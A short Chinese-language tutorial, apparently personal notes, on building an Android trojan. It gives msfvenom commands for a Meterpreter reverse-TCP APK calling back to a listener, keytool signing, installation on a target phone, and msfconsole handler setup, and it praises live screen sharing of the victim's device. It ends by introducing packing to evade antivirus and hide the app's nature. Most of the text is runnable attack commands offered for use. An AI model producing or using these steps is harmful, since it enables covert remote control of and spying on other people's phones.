### 病毒制作

#### 生成 apk 病毒文件包

首先使用 `ifconfig` 获取当前虚拟机的 ip 地址，用于接收传回来的监听信息  
假设目前获取的 ip 为 192.168.100.100

打开终端，输入如下代码创建病毒 apk  
`msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.100.100 lport=10086 R > /root/base.apk`

1. -p 设置类似于过滤器的玩意，这里必然使用 android 过滤器
2. lhost 设置监听信息送回地址
3. lport 设置监听信息送回端口
4. /root/base.apk 设置文件名以及文件保存位置

<br>

#### 为 apk 签名

依然在原来的终端输入代码进行签名：`keytool -genkey -V -keystore apk-trojan-key.keystore -alias apk -keyalg RSA -keysize 1024 -validity 999`

接下来会输入一系列参数，你看着办就好

<br>

#### 分发病毒

很简单，可以使用 xshell 的 `sftp` 方法，先下载病毒 apk，然后安装到手机就好了（一般市面上的手机都有很强的拦截能力，导致无法轻易安装病毒，那么可以改为使用模拟器）

<br>

#### msfconsole 监听

终端输入 `msfconsole` 进入 metasploit 专属的监听控制台

依次输入如下代码：
`use exploit/multi/handler` 加载监听模块  
`set payload android/meterpreter/reverse_tcp` 设置 payload  
`set lhost 192.168.100.100` 设置监听 ip  
`set lport 10086` 设置监听端口

<br>

进入监听模式，输入 `exploit`

此时，如果手机运行了病毒程序，那么该控制台就会出现对应的检测提示，此时我们可以输入 help，来查看可以对目标手机执行的操作；

比较好玩的代码是 `screenshare` 可以实时分享目标手机屏幕！

<br>

### 加壳免杀

> 根据以上部分制作的病毒依旧太脆弱，无论是手机三番五次的好心提醒与强制拦截，还是运行 app 时请求的大量权限，都完全违背了病毒的隐秘特征，则现在需要改善这一点，使其变得“人畜无害”
